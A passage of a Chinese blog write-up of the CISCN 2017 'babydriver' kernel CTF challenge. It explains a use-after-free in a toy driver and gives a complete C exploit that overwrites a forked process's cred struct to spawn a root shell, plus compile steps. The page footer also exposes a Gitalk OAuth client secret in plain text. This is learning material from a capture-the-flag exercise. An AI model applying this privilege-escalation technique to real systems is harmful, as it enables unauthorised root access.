+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, <span class="built_in">buffer</span>);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, <span class="built_in">buffer</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>babyrelease</strong>:释放babydev_struct.device_buf空间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">"device release\n"</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>思路</strong></p>
+<p>题目中的函数并没有溢出，但是存在一个条件竞争导致的UAF。因为babydev_struct是一个全局变量，当我们打开两次/dev/babydev设备，使用的是同一个块内存存放。当释放其中一个设备，另一个设备依然可以使用这块内存空间，造成一个UAF漏洞。</p>
+<p>如何提权呢？通过修改cred结构体来提权到root,4.4.72的cred结构体如下。我们只需要将gid和uid修改为0，就能提权到root。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们得出利用流程</p>
+<ul>
+<li><p>申请两次设备</p>
+</li>
+<li><p>使用ioctl将第一个设备的babydev_struct缓冲区大小改为0xa8.  <strong>sizeo(struct cred)</strong></p>
+</li>
+<li><p>释放第一个设备</p>
+</li>
+<li><p>fork一个进程，然后cred会申请到刚才被释放的babydev_struct缓冲区中，产生一个UAF</p>
+</li>
+<li><p>通过第二个设备的写功能，将uid和gid修改为0</p>
+</li>
+</ul>
+<p>exploit需要用c来编写，在mac下编译我尝试用x86_64-elf-gcc做交叉编译,不过有一些问题，所以还是尽量直接用ubuntu编译吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo port install x86_64-elf-gcc</span><br></pre></td></tr></table></figure>
+
+<p>完整的Exploit,参考ctfwiki上的exploit</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 打开两次设备</span></span><br><span class="line">	<span class="keyword">int</span> fd1 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> fd2 = <span class="built_in">open</span>(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">	ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放 fd1</span></span><br><span class="line">	<span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">	<span class="keyword">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">		<span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">			system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用wait，等待子进程结束</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>静态编译Exploit，因为kernel中没有编译过libc。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp -static</span><br></pre></td></tr></table></figure>
+
+<p>最后打包文件系统，重新起系统。在/tmp目录下运行exp即可获得一个root权限的shell。</p>
+<p>这道题主要还是体验为主，很多细节部分还不是很清楚，特别是调试部分，用户态和内核态调试还是比较麻烦的。</p>
+<p><img src="https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/xuexrV.png" alt="xuexrV"></p>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><strong>LKM入门</strong><a href="">参考</a></p>
+<p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">KERNEL PWNCISCN 2017 babydriver题解</a></p>
+<p><a href="http://boxcounter.com/attachments/2013-11-08/osx下搭建操作系统开发环境之64位交叉开发工具集（gcc+gdb）v1.0.pdf" target="_blank" rel="noopener">64位交叉开发工具集</a></p>
+<p><a href="https://www.lhyerror404.cn/2020/03/23/[转]kernel-pwn-学习之路一/" target="_blank" rel="noopener">kernel-pwn-学习之路一</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://migraine-sudo.github.io/2020/03/14/kernel-pwn/" data-id="ckjwk7mhw0000tsjheue9gphc"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/04/15/AFL-v8/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            AFL源代码阅读
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/22/roll-a-v8/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">PlaidCTF - roll a d8</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '5ae4e05700db25ed5406',
+      clientSecret: '8a38a8cb845b0b6198a0c59cab9df498ac778343',
+      repo: 'migraine-sudo.github.io',
+      owner: 'migraine-sudo',
+      admin: ['migraine-sudo'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2021 Migraine殇</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/fujiang.jpg" alt="Migraine殇"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/tags">Tags</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
